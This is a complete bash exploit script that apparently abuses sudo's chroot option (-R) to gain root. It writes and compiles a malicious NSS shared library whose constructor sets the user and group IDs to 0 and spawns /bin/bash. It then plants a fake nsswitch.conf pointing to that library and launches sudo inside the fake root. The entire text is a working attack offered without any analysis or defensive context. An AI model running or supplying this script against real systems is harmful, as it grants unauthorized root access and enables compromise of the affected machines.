#!/bin/bash

STAGE_DIR=$(mktemp -d /tmp/fakeroot.stage.XXXXXX)
cd ${STAGE_DIR?} || exit 1

cat > nc4nss1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void fakeroot(void) {
    setreuid(0,0); 
    setregid(0,0); 
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL); 
}
EOF

echo "[*] Creating config with fake root"
mkdir -p fakeroot/etc libnss_
echo "passwd: /nc4nss1337" > fakeroot/etc/nsswitch.conf
cp /etc/group fakeroot/etc

gcc -shared -fPIC -Wl,-init,fakeroot -o libnss_/nc4nss1337.so.2 nc4nss1337.c

echo "[*] Launching sudo with fake root"
sudo -R fakeroot fakeroot

rm -rf ${STAGE_DIR?}
